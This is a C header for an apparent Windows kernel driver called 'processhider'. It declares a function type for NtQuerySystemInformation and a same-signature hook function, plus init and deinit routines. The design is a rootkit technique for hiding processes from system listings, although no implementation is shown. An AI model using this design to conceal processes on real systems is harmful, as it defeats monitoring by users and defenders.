#pragma once

#include <ntddk.h>
#include "processhider_algorithm.h"


/**
  * NtQuerySystemInformation function type
  */
typedef NTSTATUS (*NtQuerySystemInformation_t)(
    IN      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN  OUT PVOID                    SystemInformation,
    IN      ULONG                    SystemInformationLength,
    OUT     PULONG                   ReturnLength               OPTIONAL
);

/**
  *
  */
int processhider_init();

/**
  *
  */
int processhider_deinit();

/**
  *
  */
NTSTATUS process_hook_function(IN       SYSTEM_INFORMATION_CLASS SystemInformationClass,
                               IN OUT   PVOID                    SystemInformation,
                               IN       ULONG                    SystemInformationLength,
                               OUT      PULONG                   ReturnLength               OPTIONAL);
